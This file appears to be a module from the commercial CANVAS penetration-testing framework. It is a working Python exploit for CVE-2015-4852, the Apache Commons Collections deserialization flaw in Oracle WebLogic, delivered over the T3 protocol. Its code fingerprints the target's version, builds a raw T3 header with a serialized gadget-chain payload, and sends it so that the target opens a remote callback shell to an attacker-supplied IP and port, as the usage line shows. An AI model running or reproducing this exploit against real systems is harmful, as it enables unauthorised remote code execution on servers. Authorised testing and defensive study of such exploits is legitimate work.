#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import logging
import os
import struct
import socket

from urllib import quote
from time import sleep

if "." not in sys.path:
    sys.path.append(".")

import canvasengine
import urllib
import random
import libs.spkproxy as spkproxy
from libs.apache_commons_deserialize import objectcreator

from exploitutils import *
from tcpexploit import *
from canvasexploit import *

NAME                            = "weblogic_t3_deserialization"
DESCRIPTION                     = "Weblogic 12.2.1.0 Apache Commons pre-3.2.2 Deserialization Code Execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Oracle"
DOCUMENTATION['Repeatability']  = "One Shot"
DOCUMENTATION['CVE Name']       = "CVE-2015-4852"
DOCUMENTATION['CVE Url']        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4852"
DOCUMENTATION['References']     = ['http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/',
                                   'https://blogs.apache.org/foundation/entry/apache_commons_statement_to_widespread',
                                   'http://www.oracle.com/technetwork/topcis/security/alert-cve-2015-4852-2763333.html',
                                   'https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-7501'
]

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"

DOCUMENTATION['NOTES'] = """
IMPORTANT NOTE: Any instance of this application running Apache Commons Collections version prior to 3.0 WILL NOT WORK.


Weblogic's AdminServer servlet allows remote administration (often unauthenticated) via the
proprietary T3 protocol. This protocol is similar to RMI in the sense that it depends on the exchange
of serialized Java objects that are then re-serialized. Apache Commons pre-3.2.2 allows users to
serialize transformers on collection values. Of importance to us is the InvokerTransfomer, which
is capable of invoking Java methods. We are able to run these transformers by adding them to an
annotation map whose members are acccessed. The right chain of method invocations leads to arbitrary
code execution.

Version support:
Installer did not support the JVM version unless marked otherwise.
> Ubuntu Linux 14.04.3 - x86
- 10.3.6 on Java SE 6
- 10.3.6 on JRockit 1.6 - NOT SUPPORTED
- 12.2.1 on Java SE 8 ()
- 12.1.2 on Java SE 7 / 8
- 12.1.3 on Java SE 7 / 8
> Windows 7 Ultimate SP 1 x86
- 12.1.3 on Java SE 8 - FAILED
- 12.1.3 on Java SE 7
- 12.1.2 on Java SE 7
- 12.2.1 on Java SE 8 - FAILED
- 12.2.1 on Java SE 6 - Installer does not support Java version
- 12.2.1 on Java SE 7 - Installer does not support Java version
- 10.3.6 on Java SE 6
- 10.3.6 on JRockit 1.6 - NOT SUPPORTED

"""

CHANGELOG = """
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port                   = 7001
        self.host                   = ""
        self.discovered_version     = None
        self.done                   = 0
        self.ssl                    = ""
        self.name                   = NAME
        self.basepath               = ""

        self.mosdef_type            = "UNIVERSAL"
        self.http_ssl               = False

        self.basicauth_user         = ""
        self.basicauth_password     = ""
        self.hostname               = None
        self.content_type           = ""
        self.perform_version_check  = True

        self.min_version_re         = re.compile("greater than or equal to (?P<min_version>[\d\.]+) ")
        self.version_re             = re.compile("HELO:(?P<version>[\d\.]+)\.[a-zA-Z]")
        self.targetpath             = "/"

        # MOSDEF options
        self.autoFind               = False
        return

    def neededListenerTypes(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        if mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def needs_mosdef_http(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        return mosdef_type == "HTTP"

    def needs_mosdef_ssl(self):
        return self.http_ssl

    def evil_t3_message(self, version):
        HEADER_LENGTH_SIZE = 4
        payload_type = "java.util.Random" if "10.3.6" in version else "java.net.InetAddr"

        payload = objectcreator(callback_ip=self.callback.ip,
                                callback_port=self.callback.port,
                                use_http=self.needs_mosdef_http(),
                                use_ssl=False).get_payload(payload_type)

        header = "\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x30\x89\xf4\x5d\x9b\xbc\xf4\x7a\x28\xbc\xca\x70\x70\x18\x1e\x29\xd8\x3f\x5b\x6b\x8a\x60\x22\x04\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00"

        interior = header + payload

        return (struct.pack(">L", len(interior) + HEADER_LENGTH_SIZE) + interior)


    def getargs(self):
        """
        Get arguments for attack
        """
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.basepath=self.argsDict.get("basepath",self.basepath)
        self.command=self.argsDict.get("command",self.command)
        self.perform_version_check = self.argsDict.get("perform_version_check",
                                                       self.perform_version_check)
        self.ssl=self.argsDict.get("ssl",self.ssl)
        return

    def is_vulnerable_version(self, version_string):
        if not re.match("[0-9\.]+", version_string):
            return False

        return ("10.3.6" <= version_string) and (version_string <= "12.2.1.0")

    def extract_regex_result(self, string, regex, field_name):
        result = regex.search(string)

        if not result:
            return None
        else:
            result_dict = result.groupdict()
            if field_name not in result_dict:
                return None
            else:
                return result_dict[field_name]

    def getsocket(self):
        if ":" in self.host:
            return self.gettcpsock(AF_INET6=1)
        else:
            return self.gettcpsock()

    def test(self):
        self.getargs()

        self.setInfo("%s testing for vulnerable version %s:%d (in progress)" % (self.name, self.host, self.port))

        sock = self.getsocket()
        sock.set_timeout(5)
        sock.connect((self.host, self.port))

        # for some reason 1.0 will cause a socket timeout but 1.0.0 won't.
        sock.sendall("t3 1.0.0\n\n")
        error_msg = sock.recv(1024)
        sock.close()

        min_version = self.extract_regex_result(error_msg, self.min_version_re, "min_version")

        if min_version == None:
            logging.error("Failed to determine minimum version field (needed to craft T3 init message)")
            self.setInfo("Failed")
            return 0

        self.min_version = min_version

        t3_init = "t3 %s\nAS:255\nHL:19\n\n" % (self.min_version)

        sock = self.getsocket()
        sock.set_timeout(5)
        sock.connect((self.host, self.port))

        sock.sendall(t3_init)

        response = sock.recv(1024)

        if len(response.split(".")) <= 2:
            while not response.endswith("\n\n"):
                response += sock.recv(1024)

        version = self.extract_regex_result(response, self.version_re, "version")
        logging.info("Target is running version: %s" % version)

        vulnerable = False
        if self.perform_version_check:
            vulnerable = self.is_vulnerable_version(version)
        else:
            vulnerable = True

        if vulnerable:
            self.discovered_version = version

        return vulnerable

    def run(self):
        self.getargs()
        self.setProgress(50)

        self.setInfo("%s attacking %s:%d (version: %s) (in progress)" % (self.name,
                                                                      self.host,
                                                                      self.port,
                                                                      self.discovered_version
                                                                  ))

        t3_init = "t3 %s\nAS:255\nHL:19\n\n" % (self.min_version)

        sock = self.getsocket()
        sock.set_timeout(5)
        sock.connect((self.host, self.port))

        sock.sendall(t3_init)
        response = sock.recv(1024)

        if len(response.split(".")) <= 2:
            while not response.endswith("\n\n"):
                response += sock.recv(1024)

        sock.sendall(self.evil_t3_message(self.discovered_version))
        sock.close()

        logging.info("Payload sent")

        self.setProgress(100)

        return 1

    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                 [optional]")
        logging.info("-O basepath: /path/to/vbulletin/ [optional]")
        logging.info("-O hostname: target vhost        [optional]")
        logging.info("-l call back ip for standard callback")
        logging.info("-d listening port for callback")
        return


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
